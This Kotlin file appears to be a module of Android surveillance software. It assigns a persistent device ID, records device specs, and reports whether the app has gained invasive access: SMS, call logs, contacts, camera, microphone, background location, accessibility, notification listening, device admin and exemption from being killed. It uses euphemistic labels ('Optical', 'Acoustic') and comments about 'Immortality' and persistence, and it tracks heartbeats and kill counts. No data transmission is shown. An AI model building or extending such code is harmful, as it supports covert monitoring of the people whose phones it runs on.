package com.example.myandroid

import android.app.ActivityManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.DisplayMetrics
import android.view.WindowManager
import org.json.JSONObject
import java.io.File

object DeviceManager {

    fun getDeviceId(ctx: Context): String {
        val prefs = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE)
        var id = prefs.getString("device_uuid", null)
        if (id == null) {
            id = java.util.UUID.randomUUID().toString()
            prefs.edit().putString("device_uuid", id).apply()
        }
        return id!!
    }

    fun getStaticInfo(ctx: Context): JSONObject {
        val deviceId = getDeviceId(ctx)
        val json = JSONObject()
        try {
            // 0. Identity
            json.put("device_id", deviceId)
            
            // 1. Software
            json.put("model", Build.MODEL)
            json.put("manufacturer", Build.MANUFACTURER)
            json.put("brand", Build.BRAND)
            json.put("device", Build.DEVICE)
            json.put("board", Build.BOARD)
            json.put("android_ver", Build.VERSION.RELEASE)
            json.put("sdk", Build.VERSION.SDK_INT)
            json.put("security_patch", Build.VERSION.SECURITY_PATCH)
            
            // 2. Hardware (RAM)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            json.put("total_ram_gb", memInfo.totalMem / (1024.0 * 1024.0 * 1024.0))
            
            // 3. Display
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            json.put("screen_res", "${dm.widthPixels}x${dm.heightPixels}")
            json.put("screen_dpi", dm.densityDpi)
            
            // 4. CPU (Rough estimate)
            json.put("cpu_cores", Runtime.getRuntime().availableProcessors())
            json.put("arch", System.getProperty("os.arch"))

        } catch (e: Exception) { e.printStackTrace() }
        return json
    }

    fun getDiagnosticReport(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("\n--- System Diagnostics ---\n")
        
        // 1. Policy Status
        sb.append("Power Policy:       ").append(if(PermissionManager.isIgnored(ctx)) "[Unrestricted]" else "[Standard]").append("\n")
        sb.append("Overlay Access:     ").append(if(PermissionManager.hasOverlayAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
        sb.append("DND Access:         ").append(if(PermissionManager.hasDndAccess(ctx)) "[Enabled]" else "[Disabled]").append("\n")
        sb.append("Device Admin:       ").append(if(PermissionManager.isAdmin(ctx)) "[Enabled]" else "[Disabled]").append("\n")
        sb.append("Persistence (Alarm):").append(if(PermissionManager.hasExactAlarm(ctx)) "[Exact]" else "[Standard/Lazy]").append("\n")
        
        // 2. Background Services
        sb.append("Accessibility:      ").append(if(PermissionManager.hasAccessibility(ctx)) "[Running]" else "[Stopped/Restricted]").append("\n")
        sb.append("Notification Sync:  ").append(if(PermissionManager.hasNotificationListener(ctx)) "[Running]" else "[Stopped]").append("\n")
        sb.append("Usage Analytics:    ").append(if(PermissionManager.hasUsageStats(ctx)) "[Running]" else "[Stopped]").append("\n")

        // 3. App Permissions
        val perms = mutableMapOf(
            "Loc-FG" to android.Manifest.permission.ACCESS_FINE_LOCATION,
            "Loc-BG" to android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            "SMS" to android.Manifest.permission.READ_SMS,
            "Call-R" to android.Manifest.permission.READ_CALL_LOG,
            "Call-W" to android.Manifest.permission.WRITE_CALL_LOG,
            "Contacts" to android.Manifest.permission.READ_CONTACTS,
            "Optical" to android.Manifest.permission.CAMERA,
            "Acoustic" to android.Manifest.permission.RECORD_AUDIO
        )
        if (android.os.Build.VERSION.SDK_INT >= 33) perms["Notif"] = android.Manifest.permission.POST_NOTIFICATIONS
        
        sb.append("Permissions:        ")
        perms.forEach { (k, v) ->
            val granted = try {
                if (v == android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) PermissionManager.hasBackgroundLocation(ctx)
                else androidx.core.content.ContextCompat.checkSelfPermission(ctx, v) == PackageManager.PERMISSION_GRANTED
            } catch(e: Exception) { false }
            sb.append("$k:").append(if(granted) "✓ " else "✗ ")
        }
        sb.append("\nFile Access:        ").append(if(PermissionManager.hasAllFilesAccess(ctx)) "[Full]" else "[Limited]").append("\n")
        
        // 4. Health
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val kills = try { JSONObject(prefs.getString("app_health", "{}")).optInt("kill_count", 0) } catch(e:Exception){0}
        sb.append("Interrupts:         $kills\n")
        sb.append("Last Sync:          ${java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date(prefs.getLong("last_heartbeat", 0L)))}")
        
        return sb.toString()
    }

    fun getDeviceScore(ctx: Context): Pair<Int, String> {
        var score = 0
        try {
            // 1. RAM (Max 40)
            val actManager = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            val ramGb = memInfo.totalMem / (1024.0 * 1024.0 * 1024.0)
            
            score += when {
                ramGb >= 11.5 -> 40
                ramGb >= 7.5 -> 30
                ramGb >= 5.5 -> 20
                ramGb >= 3.5 -> 10
                else -> 5
            }
            // 2. CPU (Max 20)
            val cores = Runtime.getRuntime().availableProcessors()
            score += if (cores >= 8) 15 else 5
            if (Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()) score += 5
            // 3. OS (Max 25)
            val sdk = Build.VERSION.SDK_INT
            score += when {
                sdk >= 34 -> 25
                sdk >= 31 -> 20
                sdk >= 29 -> 15
                else -> 5
            }
            // 4. DISPLAY (Max 15)
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)
            if (dm.densityDpi >= 400) score += 15 else if (dm.densityDpi >= 300) score += 10 else score += 5
        } catch (e: Exception) { return Pair(0, "UNKNOWN") }

        val label = when(score) {
            in 90..100 -> "Premium Tier"
            in 75..89 -> "High Performance"
            in 55..74 -> "Standard"
            in 30..54 -> "Legacy"
            else -> "Deprecated"
        }
        return Pair(score, label)
    }

    fun getHealthStats(ctx: Context): JSONObject {
        val json = JSONObject()
        
        // 1. Permission Matrix
        val perms = JSONObject()
        val critical = listOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.MANAGE_EXTERNAL_STORAGE
        )
        for (p in critical) {
            val name = p.split(".").last()
            val granted = if (p == android.Manifest.permission.MANAGE_EXTERNAL_STORAGE && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                android.os.Environment.isExternalStorageManager()
            } else {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            }
            perms.put(name, granted)
        }
        json.put("permissions", perms)

        // 2. Service Status
        json.put("accessibility_alive", PermissionManager.hasAccessibility(ctx))
        json.put("notification_listener_alive", PermissionManager.hasNotificationListener(ctx))
        json.put("usage_stats_alive", PermissionManager.hasUsageStats(ctx))

        // 3. Immortality & Admin Status
        json.put("battery_optimization_ignored", PermissionManager.isIgnored(ctx))
        json.put("overlay_allowed", PermissionManager.hasOverlayAccess(ctx))
        json.put("dnd_access_allowed", PermissionManager.hasDndAccess(ctx))
        json.put("device_admin_active", PermissionManager.isAdmin(ctx))
        
        // 4. App Interaction
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        json.put("total_interactions_recorded", prefs.getInt("interaction_count", 0))
        json.put("uptime_timestamp", System.currentTimeMillis())

        return json
    }
}